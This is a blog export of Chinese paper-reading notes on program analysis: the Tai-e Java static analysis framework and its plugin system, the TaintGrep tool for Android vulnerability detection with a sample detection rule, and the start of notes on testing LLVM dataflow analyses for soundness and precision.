<p><img src="https://i.imgs.ovh/2023/10/10/LyM5R.png" alt="image-20231009091537569"></p>
<p>在图2中，右侧的是 Tai-e 的设计，使用了类似虚拟内存的页表思想，他们在实践中往往使用二级页表，在上下文敏感的指针分析中这平均节约了 23%（up to 40%） 的内存。当作者把内存限制为某一个值比如 8G，这有利于 Tai-e 拓展更多的基准。作者注意到 Doop 是申明式的，他的 points-to 集合表示开发者无法获取，并且不同的 Datalog 引擎可能有不同的表示。</p>
<h3 id="context-manager"><a href="#context-manager" class="headerlink" title="context manager"></a>context manager</h3><p>上下文敏感被广泛用于提高 Java 指针分析的精度。作者需要一个管理上下文敏感变量（call-site-，object-，type-sensitivity）的策略。</p>
<p>Soot 没有一个搞笑的上下文敏感指针分析系统，Spark 是一个上下文不敏感的。Paddle 是 Soot 的 BDD-based 上下文敏感指针分析，但是它比 Doop 低效很多，并且它还很久没维护了。Doop 提供了一些优雅的规则以处理上下文敏感，然而因为 Datalog 的限制，对每一个上下文长度，方法调用，堆内存，开发者不得不写一个实现，导致了一些荣誉。<del>（感觉 Doop 也可以有挺好的拓展性）</del>。</p>
<p>与之相反，Tai-e 是命令式的，对于相似的上下文敏感分析实现，它能够轻易的把上下文长度视为输入参数。而 Wala 只提供了函数调用的上下文管理，并且它的堆上下文是直接继承自包含它的调用点（call site）的函数的堆对象。相比于 Wala，Tai-e 在这里更加灵活。</p>
<p>Tai-a 还提供了可选的上下文敏感工具并且在大型和复杂的 Java 程序中也有不错的精度。现在比较先进的可选的指针分析比如 **Zipper ,Zipper𝑒 , Scaler 和 Mahjong **都被 Tai-e 集成进去了，作为一个统一的的指针分析框架以比较不同的上下文敏感分析方法。</p>
<h2 id="Control-x2F-Data-Flow-Analysis"><a href="#Control-x2F-Data-Flow-Analysis" class="headerlink" title="Control&#x2F;Data Flow Analysis"></a>Control&#x2F;Data Flow Analysis</h2><h3 id="Control-Flow-Analysis"><a href="#Control-Flow-Analysis" class="headerlink" title="Control Flow Analysis"></a>Control Flow Analysis</h3><p>CFG 尽管基础，但是如何让开发者易于使用，也不容易。</p>
<p>Tai-e 对边进行分类，与 Soot，Wala，Checker 相比分类了比如IF_TRUE，IF_FAUSE，CAUGHT_EXCEPTION 的边类型。尽管他们也可以从相对应的节点或者 IR 中获取边的类型，很不方便就是说。</p>
<p>异常的边对程序分析的影响很大，有两种异常，显式的（throw）与隐式的，显示应当被 catch 处理，隐式的一场被 JVM 抛出，一个完整的 CFG 分析应该包含二者，但是隐式的异常控制流又非常的多并且他们对控制流的影响不是特别大，如果考虑进隐式的异常控制流可能会减小程序的精度和可用性。与 Wala，SpotBugs 和 Checker 不同的是，Tai-e 和 Soot 区分了显式和隐式的异常控制流，允许用户自己添加。</p>
<h3 id="Data-Flow-Analysis"><a href="#Data-Flow-Analysis" class="headerlink" title="Data Flow Analysis"></a>Data Flow Analysis</h3><p>开发者为了实现数据流分析，通常跟随数据流分析系统的接口来实现，具体有（1）data facts 抽象和初始化（2）让不同 statements 近似的转换函数（3）meet join 操作运算，作为合并 data facts 的依据。</p>
<h4 id="Data-facts-initialization"><a href="#Data-facts-initialization" class="headerlink" title="Data facts initialization"></a>Data facts initialization</h4><p>Wala 不支持在分析中初始化 data facts，他把相关的 API 放到了 solver 中，在实现分析的过程中导致了不必要的实现（需要去了解 solver 的细节）。</p>
<h4 id="Edge-transfer-function"><a href="#Edge-transfer-function" class="headerlink" title="Edge transfer function"></a>Edge transfer function</h4><p>Soot 和 Checker 并没有显式地支持 edge transfer function。</p>
<p>Edge transfer 与 node transfer 不同，edge transfer 可以允许不同的 data facts 沿着边传送到后继的 node（节点），利用了分支信息创造了更高效的分析。如果 edge transfer 函数为空，那么这时，分析就回退成为只有 node transfer 函数的分析。在 Soot 中，它为了处理分支信息，开发者需要拓展一个特殊的 analysis 叫做 BranchedFlowAnalysis 而且还要实现其 edges 和 nodes 的逻辑，这很不方便，在设计上也有一些繁琐。 Checker 也不显式地支持 edge tansfer，但是他在处理 node transfer 中区分了不同的类型，比如 then 和 else branches。求解器会沿着这个传播信息。</p>
<p>Checker 与其他架构有所不同，它通过允许开发者给 type 写 qualifiers（尤其是 Java annotations），增强了 Java 的类型系统，这种方法在实践中提高了分析的效率。他们（Tai-e）可能会在这方面继续做一些研究，如何合并进这种类型系统。</p>
<h1 id="NEW-ANALYSIS-DEVELOPMENT"><a href="#NEW-ANALYSIS-DEVELOPMENT" class="headerlink" title="NEW ANALYSIS DEVELOPMENT"></a>NEW ANALYSIS DEVELOPMENT</h1><p>静态分析框架应该提供一个机制以合并进新的 analyses，包括过程内和过程间的分析。Tai-e 支持这些功能使得其易于开发和并入新的 analysis。</p>
<h2 id="Past-Work"><a href="#Past-Work" class="headerlink" title="Past Work"></a>Past Work</h2><p>Doop 很自然地支持 interactive analysis（指的应该是要和指针分析交互的分析如 reflection analysis，exception analysis等）并且能够产生优雅的实现，Doop 从 Datalog 的申明式能力中获益，然而 Doop 也受限于 Datalog 在实现 analysis 时需要 not-set-based lattices。<del>（不懂）</del>，并且由于 Datalog solver 采用了 analysis-independent 数据结构和执行策略，它比较难对具体的 analyses 优化。最终，推进交互分析的命令式框架有很高的呼声。作为代表，Soot 缺少了这一部分而 Wala 做到了一定程度。</p>
<p>Wala 提供了一个添加新的可以和 pointer analysis 交互的 analysis 的方法，但是有一定的限制，简单地说，开发者需要实现一个叫做 ContextSelector 的接口来具体说明相关的调用点（call site）。举例来说，为了分析反射的调用 <code>v=c.newInstance()</code>，开发者需要编写 ContextSelector以识别这个 call site 并且获取被 c 指向的 Class objects，称作 CO，然后开发者需要实现 ContextInterpreter 以生成不同的虚构但是等效的 IRs，根据从 CO 中分析出的类型，叫做T。然后这些生成的 IRs 回到指针分析中维持反射调用的清晰度（resolution）。</p>
<p>这个方法非常的直白但是对指针分析的交互促进有一定的限制。</p>
<ol>
<li>对于具体的分析，开发者只能专注于并解决相关的 call site；监视特定变量的 points-to information 的能力是需要的，举例来说，在异常分析中，如果变量 e points-to 集合在 throw 的过程中被改变了，相应于 catch 变量的 points-to 集合就应被更新了。</li>
<li>在许多情况下直接更新调用图边或points-to 集合更简单，这可以防止创建过多的虚假 IR，并且调用求解器重新分析创建的代码。</li>
</ol>
<p>Helm 等人提出一种动态写作各种分析的方法，即使具有不同的分析格。但是这种方法过于复杂无法解决作者的问题。<del>（解决的主要问题不是 friendly 嘛，这本身就有一点矛盾的）</del></p>
<p>为了从实践上促进新 analysis（那些需要和指针分析交互的 analysis）的开发，在 Tai-e 中，作者提出一种简单且搞笑的方法 analysis plugin system。当前有很多基于这个系统的插件，包括了基础的比如反射和异常分析，客体比如污点追踪分析，公共工具比如 analysis timer 和 constraint checker。</p>
<h2 id="Basic-Idea"><a href="#Basic-Idea" class="headerlink" title="Basic Idea"></a>Basic Idea</h2><p><img src="https://i.imgs.ovh/2023/10/10/Lywrp.png" alt="image-20231009202348399"></p>
<p>接下来解释 analysis plugin system 怎么工作。如图3，这个系统包含了一个指针分析 solver 和一些用户定义的分析与前者交互。Solver 和 Plugin 的核心被分别高亮为蓝色和红色，开发者只需要实现和 Plugin 相关的 APIs 就可以开发新的 analysis。额外的辅助 API 比如 addStmt（模拟调用的效果，和前问提及的 Wala 相似）使得创建具体的功能更加简单。</p>
<p>让我们阐述它的基本工作机制，驱使那些核心的 APIs。假定你在实现某个 analysis Plugin 的onNewPointsToSet 方法，当变量 Var 的  points-to set（PTS）改变了，你需要写处理相关的副作用的逻辑。结果就是，你需要更新和指针相关的 PTS，或者添加一个 call graph edges 相关的 call sites。因此，在实现 onNewPointsToSet 时，你需要调用 addPointsTo 或者 addCallEdge 方法来提示这些变化。</p>
<p>相反的说，在分析的迭代中，Solver 会自动的调用 onNewPointsToSet 和 onNewCallEdge 方法来提示变量（Var，PTS）可能发生的改变。最终，开发者只需要 Plugin 的几个模块就可以实现目的了。</p>
<h2 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study"></a>Case Study</h2><p><img src="https://i.imgs.ovh/2023/10/10/Ly3BT.png" alt="image-20231009205124208"></p>
<p>为了更好的理解怎样构建新的 analyses ，作者给了一个例子，如图4。</p>
<p>下面是一个污点追踪的例子。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1</span> <span class="token class-name">String</span> s1 <span class="token operator">=</span> x<span class="token punctuation">.</span><span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token number">2</span> s3 <span class="token operator">=</span> s2<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token number">3</span> y<span class="token punctuation">.</span><span class="token function">sink</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>x.source() 返回了一个对象 o1，o1 又被混合成为 o3，o3 被 s3指向，s3 由 s2.concat(s1) 返回，污点追踪报告了第三行包含泄露 o1（敏感数据），当 o3 被一个 sink 方法调用时。</p>
<p>因为污点追踪被开发为一个 analysis 插件，他需要实现一些 Plugin 的方法，在图4中，实现了 onNewCallEdge（3行），onNewPointsToSet（12行）和辅助函数 onFinish（21行）。</p>
<p>对于 onNewCallEdge，假定我们在处理第一行 call site（String s1&#x3D;x.source()），对于这个调用点，指针分析已经创建了从 edge source（被表示为 edge.cs 的 call site）到edge target 的新的 call graph，然后求解器通知污点追踪插件并且传入作为参数的新边（3行），通过调用插件的 onNewCallEdge 函数。</p>
<p>然后插件检查 edge.target。如果 target 是一个敏感的方法，是 source（图4第4行）。一个污点对象就被创建了（5行），然后插件给 solver 更新了那个 call site 的 left-hand 变量（edge.cs.lhsV），叫做 s1（6行），s1应该指向刚创建的污点对象。</p>
<p>如果 target 是一个 transfer 方法（7行），他就会把污点传到其他的对象中。<del>（忽略一点点论文细节）</del></p>
<h1 id="MULTIPLE-ANALYSES-MANAGEMENT"><a href="#MULTIPLE-ANALYSES-MANAGEMENT" class="headerlink" title="MULTIPLE ANALYSES MANAGEMENT"></a>MULTIPLE ANALYSES MANAGEMENT</h1><p>很多情况下，一个分析依赖于另一个分析的输出，如果提供这种机制，对框架非常有帮助。接下来是关于增氧配置 analysis 依赖和怎样保存一个 analysis 的输出并且从另外的地方访问。</p>
<h2 id="Configure-Analysis-and-its-Dependencies"><a href="#Configure-Analysis-and-its-Dependencies" class="headerlink" title="Configure Analysis and its Dependencies"></a>Configure Analysis and its Dependencies</h2><p>Wala 没有显式的管理来进行多重分析。在 Soot 中，为了添加新的分析，开发者需要硬编码代码进 Soot 中，而 Tai-e 支持通过配置文件注册框架中所以的新分析（及其依赖关系），然后通过反射自动驱动它们，这样解耦了代码。此外 Soot 在运行分析之前，用户需要明确列出任何依赖分析，这样比较麻烦而且不熟悉框架的人容易出错。而在 Tai-e 中依赖关系是通过配置文件自动生成的，确保所有依赖分析正常执行。与 SpotBugs 相比，Tai-e 在解析分析依赖关系方面更加灵活，通过支持条件逻辑来描述分析选项和依赖关系。</p>
<h2 id="Store-x2F-Access-Analysis-Results"><a href="#Store-x2F-Access-Analysis-Results" class="headerlink" title="Store&#x2F;Access Analysis Results."></a>Store&#x2F;Access Analysis Results.</h2><p>这虽然看上去是一个微不足道的细节，但是也能影响使用者的体验。Soot 只能存储一些指针分析结果在 singleton instance of Scene，SpotBugs 中用户需要记住不同方法和参数以获得多样的 analysis 的相关的结果。在 Tai-e 中，用户只要记得一个方法 getResult(id) 就可以了。（id 是分析的名字和配置），而且这是对于所有类型的分析，包括了 method-，class- 和 program-level analyses。用户不再需要担心记忆复杂的方法，并且使用额外的参数来获得结果。</p>
<h1 id="EVALUATION"><a href="#EVALUATION" class="headerlink" title="EVALUATION"></a>EVALUATION</h1><p>Tai-a 的优点在前文基本都讲过，缺点也有一些。</p>
<ul>
<li>文档比较少</li>
<li>生态不够完善</li>
<li>可能某种程度上不够灵活，比如 plugin system 不能重写 visitXXX() 函数。</li>
</ul>
<p>人们仍然非常关注效率，尽管 Tai-e 的目标是 user-friendly 。作者使用了所有的标准 Java DaCapo benchmarks 加上一些在最近的文章中经常使用的 real-world 应用。</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyWfd.png" alt="image-20231010002222335"></p>
<p>在指针分析中，如表1，Tai-e 比起其他有着更好的 Recall，效率上也更高，得益于反射的精度，native code modeling，以及很多指针分析实现上的优化。</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LykRK.png" alt="image-20231010002924438"></p>
<p>在数据流分析中，作者又展示了表2中的平均数据。Tai-e 在这个分析中不如 Soot 但是比 Wala 和 SpotBugs 好，他们分析 Soot 在数据流分析中有比较复杂的优化，而这种优化在 Tai-e 中没有。<del>（怎么有一种未来可期的感觉）</del></p>
<h1 id="RELATED-WORK"><a href="#RELATED-WORK" class="headerlink" title="RELATED WORK"></a>RELATED WORK</h1><p>强相关的在前文已经提及，在这里讨论一些额外的相关的工作。</p>
<p>Lam et al. 回顾了 Soot，总结了它的主要的特征和挑战（联合单个以支持多重的分析，分析不完整的程序等），未来的方向（构建更快的 startup，提高过程间分析能力），另外他们还提及一些开发 Soot 中的困难，建议了一些未来编译器的框架。</p>
<p>Schubert et al. 描述了构建 C&#x2F;C++ 分析框架的经验，有一部分用于特定的框架，而另一部分比较通用。比如它提供了 meas like instruction 帮助调试 analysis-related bugs，Tai-e 考虑整合进这个。</p>
<p>Sadowski et al. 总结了在 Google 构建静态分析工具的经验。它建议尽早<strong>合并静态分析进工作流</strong>，尽可能把 analysis check 当作编译器报错来做（否则开发者经常遗忘分析的结果）。</p>
<p>来自 Facebook 的研究表明过程间分析对发现深层的 bugs 和安全漏洞的价值。Tai-e 的 analysis plugin system 被专门设计了，为了让开发很多复杂的与指针分析交互的过程间分析，比如精准的 virtual-call 处理和 static value-flow tracking。</p>
<p>一些研究用用户视角的方式评估静态分析工具，比如，一个好的静态分析工具应该有高质量的警告信息尽管这提供的信息可能有错误、为什么这里应该被修复、这应该专门修复等。</p>
<p>Chord 是一个由 Java 和 Datalog bddbddb 写的 Java 静态分析框架，作为 Datalog 的solver。Datalog 的优劣在前文已经讲述过了。Chord 因检测同步问题比如数据竞争的能力而知名。Tai-e 将会命令式的（imperatively）开发这些客户端。</p>
<p>OPAL 是一个由 Scala 写的 Java 静态分析框架。不幸的是对于作者来说很难和 OPAL 实现的静态分析协作。另外 OPAL 的作者主导了一个有趣的调查不同框架的 call graphs 的 soundness ，强调了有效实现语言特征的有效性。</p>
<p>Tai-e 的某些设计受 TAJS 的启发，TAJS 是一个经典的 JavaScript 和 Node.js 静态分析框架， 其中之一是回归测试，另一个是 analysis plugin system 的初始的思想。solver plugins 结构和 TAJS 的monitor approach 比较相似，尽管他们的目标不太一样。</p>
<h1 id="CONCLUSIONS"><a href="#CONCLUSIONS" class="headerlink" title="CONCLUSIONS"></a>CONCLUSIONS</h1><p>尽管静态分析发展了很多并且在过去几十年出现了一些知名的工具。对于那些依赖框架需要构建 analyses 的开发者，这些框架并不那么简单去学习和使用，因为构建一个开发者有好的静态分析框架并非易事。这篇文章在这方面前进了一步，通过系统的比较和讨论关键组件设计的权衡 Java 静态分析框架，遵循了 HGDC 原则。</p>
<p>对于每一个设计点，作者的努力是比较多 labor- 和 intelligence-intensive。他们必须比较充满复杂 analysis algorithms 的实现的大型且复杂的框架的代码。但是这些是非常值得的，因为这些帮助了 Tai-e 的诞生。且 Tai-e 达成了自己的目的 friendly。作者希望这个工作能够给静态分析基础提供比较有用的资料和观点，他们也会积极持续的开发 Tai-e，在未来合并进更多的 analyses 和 clients。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
        <tag>vulnerability mining</tag>
      </tags>
  </entry>
  <entry>
    <title>论文阅读笔记</title>
    <url>/2023/10/05/%E6%95%A3%E8%A8%98-10-5-23/</url>
    <content><![CDATA[<h1 id="論文閲讀"><a href="#論文閲讀" class="headerlink" title="論文閲讀"></a>論文閲讀</h1><blockquote>
<p>Ruiguo Yang, Jiajin Cai, and Xinhui Han. 2022. Poster: TaintGrep: A Static Analysis Tool for Detecting Vulnerabilities of Android Apps Supporting User-defined Rules. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (CCS ‘22). Association for Computing Machinery, New York, NY, USA, 3507–3509. <a href="https://doi.org/10.1145/3548606.3563527">https://doi.org/10.1145/3548606.3563527</a></p>
</blockquote>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>作者描述說大部分的安卓漏洞都屬於邏輯漏洞<del>（指的應該是應用層的漏洞）</del>，可以大部分分爲兩部分，第一部分數據，第二部分是對數據的處理。第一部分的不可靠的數據我們可以通過數據流分析得到，而對不可靠的數據進行操作則需要語義分析。</p>
<p>當前的安全研究者需要手動的去審計可能的漏洞點，然而由於第三方庫和大量的安卓程序的基礎設施和邏輯設計<del>（具體有哪些呢）</del>，這非常消耗時間，也就需要高效的自動化的方式去分析。</p>
<p>有兩種，動態分析比如 Droidfuzzer，靜態分析如 Amandroid，DroidSafe，OAuthLint，但是由於這些分析大部分都缺少語義信息，面對如 try catch 處理不了，就會產生非常多的關於 Dos 的 false positive 報錯。</p>
<p>而有一些可以進行語義模式匹配的工具比如説 CodeQL 和 Semgrep，CodeQL 的缺點是他依賴於完整的代碼和編譯環境，然而這對於安全研究者而言可遇不可求。Semgrep 的缺點是它不能識別安卓的應用的組件<del>（沒用過，不清楚這裏説的是什麽意思）</del>，也就不可能獲得那些可以有 vulnerable input 的組件。</p>
<p>綜上作者就提出了這種，既結合靜態分析中的污點追蹤，又結合語義匹配分析，還可以分析組件的<del><strong>（未開源的，逃）</strong></del>靜態分析工具。</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LysYV.png" alt="image-20231005160301135"></p>
<h2 id="METHODLOGY"><a href="#METHODLOGY" class="headerlink" title="METHODLOGY"></a>METHODLOGY</h2><p>程序接收三個輸入，程序的 java 代碼、manifest files <del>（應該是前文説的 components 分析）</del> 、用戶自定義的規則，作爲輸入，報告可以的代碼片段。由於程序並不需要對源代碼進行處理，所以對於加殼的程序也只要脫殼了就能用。這個系統包含了兩個模塊，analysis module 與 filter module，如圖所示，寫作給出最後的報告。</p>
<h3 id="System-Design"><a href="#System-Design" class="headerlink" title="System Design"></a>System Design</h3><p>analysis module 是爲了獲得基本的程式信息，對於 manifest 文件，提取了 enabled，exported，name，permission 和 intent-filter。對於應用程式，作者使用了 jeb 生成 call graph，並以 DFS 的方式生產了滿足後端規則的調用鏈。然後把這個調用鏈傳給 filter module。</p>
<p>filter module 的規則是由一開始的規則生成的，從 cross-function rules 變成 intra-function rules <del>（這裏有點不清楚，什麽是 intra-function rules）</del>，然後子模塊迭代函數然後拿規則去匹配代碼，剔除不匹配的函數鏈。如果開啓了污點追蹤，就可以計算輸入最終能否影響到最終的 sink function。最後把這個調用鏈傳給輸出，由安全研究者手動的檢查是否是漏洞。作者這個模塊的實現是基於 Semgrep <del>（沒用過，mark 一下）</del>。</p>
<h3 id="Rules-Description"><a href="#Rules-Description" class="headerlink" title="Rules Description"></a>Rules Description</h3><p>作者抽象出了大部分安卓應用的漏洞特徵。</p>
<ul>
<li>存在 source function 到 sink function 的調用鏈</li>
<li>攻擊者能控制 source function 的輸入</li>
<li>在調用鏈中存在不當的或者不完整的 parameter filters</li>
</ul>
<p>對於第一點和第二點，作者清楚的定義了分析路徑的 endpoints 和路徑上需要滿足的條件，比如函數名，能接受的 intents 以及是否對其他的 app 開放。對於第三個特徵，作者描述了數據流信息和模式信息。data-flow information 用來決定輸入是否能影響 end function，而 pattern information 用來決定是否調用鏈能否滿足相應的條件。</p>
<h2 id="PRELIMINARY-EXPERIMENT"><a href="#PRELIMINARY-EXPERIMENT" class="headerlink" title="PRELIMINARY EXPERIMENT"></a>PRELIMINARY EXPERIMENT</h2><p>作者定義了幾個漏洞規則，包括hard coded secret key，arbitrary file read&#x2F;write&#x2F;delete&#x2F;reproduce，generic DoS，unsafe URL load。後文介紹了他們的兩種規則<del>(主要是沒有源碼，這規則就很難想象)</del></p>
<h3 id="Generic-DoS"><a href="#Generic-DoS" class="headerlink" title="Generic DoS"></a>Generic DoS</h3><p>定義了 endpoint 是 getExtras 函數，并且用語義規則描述了不能被 try…catch 包裹。</p>
<p>這是他們定義的規則 </p>
<pre class="line-numbers language-none"><code class="language-none">(a) customized rules
1 semi-public components ^onCreate$
2 arbitrary components Landroid&#x2F;content&#x2F;Intent; -&gt;getExtras()Landroid&#x2F;os&#x2F;Bundle; 
3 semantic matching on 
4 semantic rules file rules.txt 
5 taint tracking off 
6 1 getIntent 

(b) rules.txt
NOT: | $TYPE $START(...) &#123;
	... 
	try &#123; 
		... 
		$END(...); 
		... 
	&#125; catch (...) &#123; 
		... 
	&#125; 
	... 
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>作者發現了70多個 Dos 的0day，還是蠻有價值的。</p>
<h3 id="Arbitrary-File-Read-x2F-Write"><a href="#Arbitrary-File-Read-x2F-Write" class="headerlink" title="Arbitrary File Read&#x2F;Write"></a>Arbitrary File Read&#x2F;Write</h3><p>endpoint 為 setResult 函數。這個函數可以傳回帶有 flag 的 intent，可能存在任意文件讀寫的漏洞。</p>
<p>和剛才的規則非常相似，就不 Ctrl CV 了。</p>
<p>因爲惡意程序需要能夠控制 intent 的 data 和 flag 部分，此處的語義規則需要找到所有能對 intent 的 data 和 flag 有一些的系統函數。<del>(這裏有一些不知所云，可能安卓的洞瞭解的比較少)</del></p>
<p>最後作者找到了 6 个任意文件讀寫的漏洞，</p>
<h2 id="CONCLUSION"><a href="#CONCLUSION" class="headerlink" title="CONCLUSION"></a>CONCLUSION</h2><p>作者基於<strong>污點追蹤</strong>和<strong>語義分析</strong>实现了<strong>自定義規則</strong>的漏洞挖掘</p>
<p>作者沒有開源代碼，并且只有寥寥3頁 <del>倒是非常節省閲讀論文的時間</del></p>
<h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p>還有很多細節，相關的論文和工具，可以深入瞭解。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
        <tag>vulnerability mining</tag>
      </tags>
  </entry>
  <entry>
    <title>论文阅读笔记</title>
    <url>/2023/09/28/%E6%95%A3%E8%A8%98-9-28-23/</url>
    <content><![CDATA[<h1 id="論文閲讀"><a href="#論文閲讀" class="headerlink" title="論文閲讀"></a>論文閲讀</h1><blockquote>
<p><em>Jubi Taneja, Zhengyang Liu, and John Regehr. 2020. Testing static analyses for precision and soundness. In Proceedings of the 18th ACM&#x2F;IEEE International Symposium on Code Generation and Optimization (CGO 2020). Association for Computing Machinery, New York, NY, USA, 81–93. <a href="https://doi.org/10.1145/3368826.3377927">https://doi.org/10.1145/3368826.3377927</a></em></p>
</blockquote>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>作者的目的是開發 formal-method-based（基於形式化的） 算法，靜態分析中的 imprecisions 和 unsoundnesses 。</p>
<p>作者的貢獻是設計並評估了數種算法來分析編譯器靜態分析結果的 soundnesses 和 precisions，他們在 LLVM 並上沒有找到新 soundness bugs ，但是可以發現以前修復的 soundness bug。 他們在 LLVM 中發現了比較多的 imprecisions 問題，并且部分被修復了。主要的分析目標是 LLVM 的重要數據流分析 <code>Known bits</code> , <code>Demanded bit</code>, <code>Integer ranges</code>, 以及一些前向分析布爾值的 sound 與 precise。</p>
<p>工作内容上，作者通過自己的算法計算代碼片段的 sound and maximally precise ，與 LLVM 自己產生的數據流信息相比較。當 LLVM 比自己的 more precise 時，可能 LLVM 的 soundnesses 就會存在問題。當 LLVM 比自己 less precise 時，他們的 precision 可能就會有問題。<del>（有點奇怪）</del></p>
<h2 id="Backround"><a href="#Backround" class="headerlink" title="Backround"></a>Backround</h2><p>作者的研究基於 Souper: A Synthesizing Superoptimizer</p>
<h3 id="Dataflow-Analysis"><a href="#Dataflow-Analysis" class="headerlink" title="Dataflow Analysis"></a>Dataflow Analysis</h3><p>數據流分析用於計算程序執行過程中的正確性。數據流分析應該是 sound ，但是它也允許 imprecision，即允許 false positive。</p>
<h3 id="Static-Analysis-in-LLVM"><a href="#Static-Analysis-in-LLVM" class="headerlink" title="Static Analysis in LLVM"></a>Static Analysis in LLVM</h3><p>LLVM 對於 靜態分析是一個非常好的基石，高級語言的 tricky 和 implicit 的一些特性比如類型轉換，表達式的順序等在 LLVM IR 中就不會出現這種妨礙分析的特性。它的 SSA 使得對函數的數據流分析變得高效且簡單。由於 LLVM 中已經實現了非常多的優化器，比如 dead code optimization，減少了工作的一些小阻礙。<del>畢竟是爲了分析 soundnesses 與 precisions，最後還要看看有沒有提升優化器能力</del>。</p>
<h4 id="Known-Bits"><a href="#Known-Bits" class="headerlink" title="Known Bits"></a>Known Bits</h4><p>用於判斷執行過程中 bit 是 0 或 1，使得算數運算中可以表現的更高效。</p>
<h4 id="Number-of-Sign-Bits"><a href="#Number-of-Sign-Bits" class="headerlink" title="Number of Sign Bits"></a>Number of Sign Bits</h4><p>符號位的高位，可能會有和符號位相同的值，可以用來節約空間。</p>
<p>由於 Number of Sign Bits 的分析準則和 Known Bits 分析准測比較相似，所以作者忽略了這一部分。</p>
<p><del>不太懂這是怎麽優化的</del></p>
<h4 id="Single-bit-Analyses"><a href="#Single-bit-Analyses" class="headerlink" title="Single-bit Analyses"></a>Single-bit Analyses</h4><p>判斷值非0，負，非負，2冪。同 Number of Sign Bits。</p>
<p>如果輸入要麽是 0 或 1，輸出對應了 0 或 1。那麽這個分析就是 sound。如果輸出為 0 或1 對應了輸入為 0 或 1，則分析是 maximally precise。</p>
<h4 id="Integer-Range-Analysis"><a href="#Integer-Range-Analysis" class="headerlink" title="Integer Range Analysis"></a>Integer Range Analysis</h4><p>優化 <code>away comparisons</code> ，比如 [0, 100) &lt; [200, 205) 可以被簡化爲 true。LLVM 的 Correlated Value Propagation pass 就是以這種方式優化程序的優化器。</p>
<p>Lazy Value Info（LVI）是 LLVM 的經典的 integer range analysis。LVI 中的 constant range 有四種形式：</p>
<ul>
<li>Empty set: 空的 concretization set </li>
<li>Full set: 包含所有整形的 concretization set</li>
<li>Regular range [a, b) with a &lt;u b: 包含所有大於等於 a 且小於 b 的 concretization set</li>
<li>Wrapped range [a, b) with a &gt;u b: 包含所以要麽大於等於a 要麽小於 b 的 concretization set</li>
</ul>
<p>a&#x3D;b&#x3D;0 和 a&#x3D;b&#x3D;UNIT_MAX 表示empty 和 full sets。</p>
<p><del>（這裏怎樣是 sound 怎樣是 precise 看不懂，以後再補充）</del></p>
<h4 id="Demanded-Bits"><a href="#Demanded-Bits" class="headerlink" title="Demanded Bits"></a>Demanded Bits</h4><p>與前面的分析不同，demanded bits 是 backword program analysis，尋找那些沒用的 bits，比如説某個 32bit 整數被裁剪為 8bit 的證書，那麽前面 24bits 就會被 demanded bits 標記為 not demanded。</p>
<p>如果 not demanded bits 被任意設置為 0 或 1 而不影響結果，那麽這個分析就是 sound。</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyInj.png" alt="image-20231004194744221"></p>
<p>如果 demanded bits 被任意設置為 0 或 1，導致了結果的改變，那麽這個分析就是 maximally precise。</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyhoI.png" alt="image-20231004195529414"></p>
<p>如果分析完發現全都是 not demanded bits，那麽 f 就可以直接被移除了。<del>似乎這種思想可以用在 d算數混淆中</del>。如果只是部分 not demanded bits ，可能我們可以用更簡單的表達式去表示。<del>看上去是一種非常好用的優化器。</del></p>
<h3 id="Reasoning-about-LLVM-using-Souper"><a href="#Reasoning-about-LLVM-using-Souper" class="headerlink" title="Reasoning about LLVM using Souper"></a>Reasoning about LLVM using Souper</h3><p>Souper 是一個開源的 “super optimizer”，運行在 LLVM middle-end optimization pass，把 LLVM IR 轉換爲它自己的 IR，并將發現的優化應用於正在編譯過程中的優化器。<del>怎麽一股 JIT 的味道</del></p>
<p>作者重用了 Souper 部分計算 precise 的 dataflow facts，因爲他們也要把 LLVM IR 轉換爲用於 SMT solvers 查詢的 IR。之後用於分析的每一部分代碼片段被稱之爲 “Souper expression”，表示了 LLVM instructions 的一個有向無環圖。</p>
<p>但是 Souper 也有一些缺陷，它無法看到内存引用，函數調用，循環迭代等。</p>
<p>Souper 在作者的工作中大部分都沒有用到。在 integer range 計算中存在一些特殊情況，後文會講到。</p>
<h2 id="Testing-Dataflow-Analyses-for-Soundness-and-Precision"><a href="#Testing-Dataflow-Analyses-for-Soundness-and-Precision" class="headerlink" title="Testing Dataflow Analyses for Soundness and Precision"></a>Testing Dataflow Analyses for Soundness and Precision</h2><p>這一節講了作者的工作，需要將解決一些 sub-problems</p>
<ul>
<li>用典型的 LLVM IR 去測試編譯器的 dataflow analyses</li>
<li>保證 LLVM 和作者的算法分析的是同樣的代碼，也就是之前提到的 peace of code，這樣方便比較</li>
<li>用 SMT 計算 precise dataflow 結果。</li>
</ul>
